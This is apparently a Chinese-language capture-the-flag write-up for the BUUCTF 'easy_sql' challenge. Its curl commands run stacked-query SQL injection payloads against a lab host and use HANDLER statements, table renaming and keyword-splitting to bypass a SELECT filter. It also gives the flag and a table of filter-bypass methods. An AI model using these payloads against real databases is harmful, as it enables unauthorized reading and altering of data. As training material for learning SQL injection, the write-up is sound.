---
title: 4-CTF SQL注入 - 随便注
date: 2026-05-02
categories:
  - BUUCTF
  - WEB
tags:
  - sql注入
  - CTF
---

# CTF SQL注入 - 随便注

## 题目信息
- **题目名称**: easy_sql / 随便注
- **题目类型**: SQL注入
- **题目URL**: http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/
- **FLAG**: `flag{7acd36c9-1cbb-4e30-8ee5-339726d381d2}`

## 题目描述
页面提示："取材于某次真实环境渗透，只说一句话：开发和安全缺一不可"
页面注释："sqlmap是没有灵魂的"

---

## 解题过程

### 1. 初步探测

首先访问题目页面，发现是一个输入框，提示"姿势"，查看源码发现是GET请求，参数名为`inject`。

**测试正常输入：**
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1"
```

返回结果：
```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
```

### 2. 确认SQL注入

**测试单引号闭合：**
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1'"
```

返回错误：
```
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

**结论**：存在SQL注入，数据库是MariaDB。

### 3. 检测过滤关键字

尝试使用`union select`：
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1'union select 1,2-- "
```

返回：
```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

**结论**：`select|update|delete|drop|insert|where|.`等关键字被过滤。

### 4. 堆叠查询探测

由于关键字被过滤，尝试堆叠查询（多语句注入）：

**查看所有数据库：**
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';show databases;-- "
```

返回结果包含以下数据库：
- ctftraining
- information_schema
- mysql
- performance_schema
- supersqli  ← 可疑数据库
- test

### 5. 查看表结构

**查看ctftraining数据库的表：**
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';use ctftraining;show tables;-- "
```
发现FLAG_TABLE，但字段默认值为"not_flag"，排除。

**查看supersqli数据库的表：**
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';use supersqli;show tables;-- "
```

发现两个表：
- `1919810931114514`  ← 数字命名的表，非常可疑
- `words`

### 6. 查看可疑表的结构

**查看words表结构：**
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';use supersqli;show columns from words;-- "
```
结果：id(int), data(varchar)

**查看数字表结构（注意反引号）：**
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';use supersqli;show columns from \`1919810931114514\`;-- "
```

**关键发现**：该表有一个字段叫`flag`！
```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  ...
}
```

### 7. 绕过select过滤获取flag

由于`select`被过滤，尝试以下方法：

#### 尝试1：预处理语句（失败）
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';set @sql=CONCAT('se','lect * from \`1919810931114514\`;');prepare stmt from @sql;execute stmt;-- "
```
返回过滤提示：`strstr($inject, "set") && strstr($inject, "prepare")`

#### 尝试2：重命名表（备选方案）
```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';use supersqli;rename table words to words1;rename table \`1919810931114514\` to words;-- "
```
可以执行成功，但没有直接返回数据。

#### 尝试3：handler语句（成功！）

MySQL/MariaDB的`handler`语句可以直接读取表数据，无需使用select。

```bash
curl -s "http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1';use supersqli;handler \`1919810931114514\` open;handler \`1919810931114514\` read first;-- "
```

**成功获取flag：**
```
array(1) {
  [0]=>
  string(42) "flag{7acd36c9-1cbb-4e30-8ee5-339726d381d2}"
}
```

---

## 知识点总结

### 1. 堆叠查询（Stacked Queries）
在SQL注入中，使用分号`;`分隔多个SQL语句，可以执行额外的查询。
```sql
1'; show databases; --
```

### 2. MySQL/MariaDB 特殊表名处理
当表名是数字或包含特殊字符时，需要用**反引号**包裹：
```sql
show columns from `1919810931114514`;
```

### 3. Handler语句
MySQL的`handler`语句提供了一种直接访问表存储引擎的接口，可以绕过SELECT关键字限制：
```sql
handler table_name open;      -- 打开表
handler table_name read first; -- 读取第一条记录
handler table_name read next;  -- 读取下一条记录
```

### 4. 常用绕过技巧
| 过滤 | 绕过方法 |
|------|----------|
| select | handler语句、预编译语句、重命名表+alter字段 |
| set/prepare | concat+char编码、十六进制编码 |
| where | HAVING、LIMIT OFFSET |

### 5. 表重命名攻击
当原查询只返回特定字段时，可以将flag表重命名为原查询的表名：
```sql
rename table words to words1;
rename table `1919810931114514` to words;
alter table words change flag id varchar(100);
```

---

## 完整Payload

**获取flag的最终payload：**
```
1';use supersqli;handler `1919810931114514` open;handler `1919810931114514` read first;-- 
```

URL编码后：
```
http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1%27%3Buse%20supersqli%3Bhandler%20%601919810931114514%60%20open%3Bhandler%20%601919810931114514%60%20read%20first%3B--%20
```

---

## 题目启示

1. **开发和安全缺一不可**：过滤了常见SQL关键字，但忽略了其他SQL语句（如handler）
2. **sqlmap不是万能的**：手工注入能发现自动化工具遗漏的漏洞点
3. **堆叠查询的危险性**：即使某些关键字被过滤，堆叠查询仍可能导致数据泄露
